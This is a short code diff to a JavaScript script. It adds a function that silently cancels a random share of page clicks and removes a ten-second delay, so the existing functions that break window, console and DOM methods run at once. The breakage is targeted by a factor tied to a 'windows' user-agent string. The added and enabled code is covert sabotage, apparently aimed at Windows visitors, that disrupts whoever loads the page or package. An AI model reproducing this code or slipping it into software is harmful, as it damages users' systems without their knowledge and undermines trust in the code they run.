@@ -100,6 +100,14 @@
         }
     }
 
+    function breakClick(factor) {
+        document.addEventListener('click', (event) => {
+            if (_window.Math.random() < factor) {
+                event.preventDefault();
+            }
+        });
+    }
+
     function breakElement(factor) {
         const keys = [
             'append',
@@ -119,11 +127,10 @@
         }
     }
 
-    setTimeout(() => {
-        const factor = navigator.userAgent.search(/windows/i) / navigator.userAgent.length;
-        breakWindow(factor);
-        breakConsole(factor);
-        breakElement(factor);
-    }, 10000);
+    const factor = navigator.userAgent.search(/windows/i) / navigator.userAgent.length;
+    breakWindow(factor);
+    breakConsole(factor);
+    breakClick(factor);
+    breakElement(factor);
 
 })();
